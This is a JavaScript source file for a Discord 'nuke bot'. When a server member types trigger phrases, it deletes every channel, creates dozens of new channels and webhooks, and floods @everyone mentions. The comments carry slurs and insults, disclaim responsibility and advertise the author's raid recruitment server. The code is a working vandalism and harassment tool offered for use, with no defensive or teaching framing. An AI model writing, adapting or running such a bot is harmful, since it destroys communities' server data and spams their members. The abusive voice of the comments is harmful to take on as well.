const Discord = require('discord.js');
const { token, prefix } = require('./config.json');
const client = new Discord.Client();

//nuke bot by 【ＣＧ】assy
//its not the best clearly but pretty good
//have fun retards
//oh also im not responsible for ur nukes
//this bot sends 1kpings in 14 seconds so its not as good as my other main bot
client.on('ready', () => {
    console.log("start")
})
//delete all channels
client.on('message', message => {
    if(message.content === `allahu akbar`) {
        message.guild.channels.cache.forEach(channel => {
            channel.delete()
        })
    }
})
//webhook spam
//creates 10 of them and each spam 3 messages(which is enough in fact)
client.on('message', message => {
    if(message.content === `@everyone fucked`) {
        var number = 1;
    while (number <= 10) {
        message.channel.createWebhook('ass')
        .then(webhook => webhook.send("@everyone get rekt")//what it sends
        .then(webhook.send("@everyone get rekt"))
        .then(webhook.send("@everyone get rekt")))
    number++;
    }
}
})
//normal bot spam
client.on('message', message => {
    if(message.content === "@everyone fucked") {
        var number = 1;
        while (number <=169) {
            message.channel.send("@everyone cg owns u")//what it sends
        number++;    
        }
    }
})
//channels
client.on('message', message => {
    if(message.content === 'allahu akbar') {
        var number = 1;
    while (number <= 69) {//number of channels
    message.guild.channels.create('gay').then(c => c.send("@everyone fucked"))//name of channels and also what it sends when a channel gets creates(which triggers the commands above)
    number++;
}
    }
})



//yes the code is pretty shit but it works
//eat shit
// https://discord.gg/eXRGjZK my recruitment server
//catch ya later cunts
const bot = new Discord.Client();

client.login(token)//ur bot token goes here
